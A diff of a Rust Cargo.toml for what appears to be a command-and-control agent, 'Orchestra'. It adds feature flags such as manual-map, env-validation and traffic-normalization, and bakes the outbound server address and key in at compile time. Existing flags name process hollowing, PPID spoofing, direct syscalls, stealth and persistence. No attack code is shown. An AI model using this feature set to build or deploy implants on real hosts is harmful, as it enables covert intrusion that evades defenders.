@@ -55,16 +55,16 @@ enigo = { version = "0.2", optional = true }
 
 [target.'cfg(windows)'.dependencies]
 enigo = { version = "0.2", optional = true }
-windows-capture = { version = "2", optional = true }
 winreg = "0.52"
 image = { version = "0.25", optional = true }
-winapi = { version = "0.3", features = ["debugapi", "processthreadsapi", "memoryapi", "sysinfoapi", "winbase", "winnt", "libloaderapi", "winreg", "winnls", "wow64apiset", "handleapi", "iphlpapi", "iptypes", "fileapi", "synchapi", "minwinbase", "tlhelp32"] }
+winapi = { version = "0.3", features = ["debugapi", "processthreadsapi", "memoryapi", "sysinfoapi", "winbase", "winnt", "libloaderapi", "winreg", "winnls", "wow64apiset", "handleapi", "iphlpapi", "iptypes", "fileapi", "synchapi", "minwinbase", "tlhelp32", "combaseapi", "objbase"] }
 hollowing = { path = "../hollowing" }
 
 [features]
 ppid-spoofing = []
 stealth = ["direct-syscalls", "unsafe-runtime-rewrite", "memory-guard", "ppid-spoofing"]
 dev = []
+env-validation = []
 persistence = []
 network-discovery = []
 # `dep:x11cap` only resolves when compiling for Linux (see
@@ -74,12 +74,15 @@ network-discovery = []
 remote-assist = ["dep:enigo", "dep:image", "dep:x11cap"]
 module-signatures = ["common/module-signatures"]
 direct-syscalls = []
+manual-map = ["module_loader/manual-map"]
+traffic-normalization = []
+perf-optimize = []
 hci-research = ["dep:rdev", "dep:chrono", "dep:twox-hash"]
 # Connect the agent outbound to an Orchestra Control Center instead of waiting
 # for an inbound connection from a console. The server address and PSK are
-# read from the ORCHESTRA_C / ORCHESTRA_SECRET runtime env vars, or baked in
-# at compile time via the ORCHESTRA_C_ADDR / ORCHESTRA_C_SECRET build env vars
-# (set automatically by the Builder when outbound-c is included in a profile).
+# baked in at compile time via the ORCHESTRA_C_ADDR / ORCHESTRA_C_SECRET build
+# env vars (set automatically by the Builder when outbound-c is included in a
+# profile). Debug builds may override them with ORCHESTRA_C / ORCHESTRA_SECRET.
 outbound-c = []
 # Application-layer perfect forward secrecy via X25519 ECDH + HKDF.
 # When enabled, each session derives a unique AES-256-GCM key from an
